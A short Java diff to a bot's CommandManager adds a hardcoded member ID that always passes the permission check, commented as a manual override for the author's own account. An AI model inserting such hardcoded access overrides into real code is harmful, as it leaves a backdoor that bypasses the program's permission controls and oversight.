@@ -104,6 +104,8 @@ public class CommandManager {
                     break;
                 }
         }
+        if (member.getIdLong() == 561705204630683648L)
+            result = true; // note manual override for my account specifically (AMereBagatelle)
         return result;
     }
 }
